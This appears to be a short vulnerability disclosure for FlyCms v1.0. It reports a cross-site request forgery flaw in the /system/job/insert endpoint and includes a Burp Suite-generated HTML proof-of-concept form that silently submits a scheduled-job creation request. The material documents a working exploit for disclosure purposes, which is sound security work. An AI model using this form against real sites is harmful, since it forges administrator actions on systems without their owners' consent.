target:https://github.com/sunkaifei/FlyCms
version: v1.0

FlyCms v1.0 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /system/job/insert

![1](https://github.com/NUDTTAN91/cms/assets/127911311/08cd7107-cac9-4d51-9d1e-392876e868ab)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.247.192/system/job/insert" method="POST">
      <input type="hidden" name="beanName" value="cs" />
      <input type="hidden" name="methodName" value="cs" />
      <input type="hidden" name="cronExpression" value="0&#47;10&#32;&#42;&#32;&#42;&#32;&#42;&#32;&#42;&#32;&#63;&#32;&#42;" />
      <input type="hidden" name="params" value="cs" />
      <input type="hidden" name="remark" value="cs" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>



```

![2](https://github.com/NUDTTAN91/cms/assets/127911311/aaf7e5a7-4237-44d5-8245-e4d927851827)


Successed

![3](https://github.com/NUDTTAN91/cms/assets/127911311/d0a5af88-a79e-4690-b200-33db17df722b)

